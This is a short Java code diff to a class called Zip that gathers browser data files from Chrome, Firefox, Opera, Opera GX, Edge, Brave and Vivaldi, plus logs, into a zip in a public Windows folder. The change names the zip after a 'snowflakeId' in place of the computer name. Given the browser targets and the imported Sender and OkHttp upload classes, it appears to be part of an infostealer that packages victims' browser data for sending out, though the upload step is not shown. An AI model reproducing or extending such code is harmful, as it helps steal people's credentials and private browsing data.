@@ -1,6 +1,7 @@
 package io.github.luxotick.impl;
 
 import io.github.luxotick.Sender;
+import io.github.luxotick.Start;
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
@@ -28,7 +29,7 @@ public class Zip {
 
         final List<String> srcFiles = Arrays.asList(chrome, firefox, opera, operagx, edge, brave, vivaldi, logs);
 
-        final FileOutputStream fos = new FileOutputStream("C:\\Users\\Public\\Documents\\" + System.getenv("COMPUTERNAME") + ".zip");
+        final FileOutputStream fos = new FileOutputStream("C:\\Users\\Public\\Documents\\" + Start.snowflakeId + ".zip");
         ZipOutputStream zipOut = new ZipOutputStream(fos);
 
         for (String srcFile : srcFiles) {
